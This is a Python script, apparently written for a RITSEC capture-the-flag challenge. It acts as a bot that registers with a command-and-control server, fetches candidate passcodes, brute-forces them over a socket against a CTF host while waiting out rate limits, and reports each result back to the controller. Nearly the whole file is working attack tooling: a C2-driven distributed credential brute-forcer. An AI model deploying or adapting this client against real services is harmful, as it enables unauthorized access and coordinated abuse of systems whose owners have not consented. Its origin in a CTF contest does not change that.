import requests
import os
import socket
import time

bingusURL = 'http://enter.your.own.c2.url.com:18337'

victim = ('ctf.ritsec.club',9009)

uuidFile = '.bingus_uuid'
sleepTime = 10

uuid = ''

def doRegister():
    thisUUID = None
    r = requests.get(bingusURL+'/register')
    data = dict(r.json())
    if 'uuid' in data:
        with open(uuidFile,'w') as fp:
            fp.write(data['uuid'])
        thisUUID = data['uuid']
    else:
        print("Didn't receive a UUID. There may be an issue here...")
    return thisUUID

def getURL(path):
    return dict(requests.get(bingusURL + path).json())

def postURL(path,data):
    return dict(requests.post(bingusURL + path, json=data).json())

if os.path.isfile(uuidFile):
    with open(uuidFile,'r') as fp:
        uuid = fp.readline().strip()
else:
    uuid = doRegister()
    if not uuid:
        print("Exiting...")
        exit(-1)
print(f"Connecting with UUID {uuid}...")
res = getURL(f'/{uuid}/check')
if res['status'] != 'success':
    os.remove(uuidFile)
    uuid = doRegister()
    res = getURL(f'/{uuid}/check')

code = ''
print("Connected! Starting bruteforce...")
while True:
    if res['cmd'] == 'getNew':
        res = getURL(f'/{uuid}/giveCode')
        if res['code']:
            code = res['code']
        else:
            print("Did not receive a code, server may be down.")
            break
    elif res['cmd'] == 'try':
        status = ''
        rateLimited = False
        time.sleep(sleepTime)
        try:
            with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                s.connect(victim)
                while True:
                    data = s.recv(1024)
                    if b'You are being rate limited' in data:
                        print("Rate limiting caught")
                        rateLimited = True
                        break # try again
                    if b'Enter the passcode to access the secret:' in data:
                        break
                if rateLimited:
                    continue
                s.sendall(code.encode() + b'\n')
                while True:
                    data = s.recv(4096)
                    if b"Closing connection..." in data:
                        break
                s.close()
        except:
            continue
        if b"That password isn't right!" in data:
            # fail
            status = 'failed'
        else:
            status = 'success'
        print(f"{status}: {code}")
        res = postURL(f"/{uuid}/codeResponse",{'code': code, 'status': status})
    elif res['cmd'] == 'die':
        os.remove(uuidFile)
        print("C&C said to die, goodbye!")
        break
    else: # unknown cmd
        print(f"Received unknown command in {res}")
        break